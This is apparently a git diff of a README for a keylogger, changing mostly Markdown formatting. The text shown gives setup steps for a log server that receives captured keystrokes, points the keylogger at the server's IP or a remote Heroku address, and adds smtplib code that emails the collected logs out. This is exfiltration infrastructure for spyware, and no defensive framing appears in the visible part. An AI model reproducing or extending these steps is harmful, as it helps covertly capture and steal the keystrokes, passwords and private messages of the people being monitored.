@@ -56,9 +56,10 @@ python log_server.py
 2. Update the keylogger’s URL to match the server’s IP/port (e.g., http://192.168.1.3:5000/log).
 
 
-##SMTP Email Transmission
+**SMTP Email Transmission**
 
 1. Modify log_server.py to send logs via email using smtplib:
+```python
 import smtplib
 from email.mime.text import MIMEText
 
@@ -71,7 +72,8 @@ def send_email(log_data, recipient_email):
         server.starttls()
         server.login('your_email@example.com', 'your_app_password')
         server.send_message(msg)
-
+---
+```
 
 2. Generate an app-specific password from your email provider (e.g., Gmail’s 2-Step Verification settings).
 
@@ -89,11 +91,14 @@ def send_email(log_data, recipient_email):
 2. Push the code: git push heroku main.
 
 3. Set dynamic port in log_server.py:
+```python
 import os
 port = int(os.environ.get('PORT', 5000))
 app.run(host='0.0.0.0', port=port)
+---
+```
 
-4. Update the keylogger’s URL to the remote server’s address.
+5. Update the keylogger’s URL to the remote server’s address.
 
 
 ## Considerations
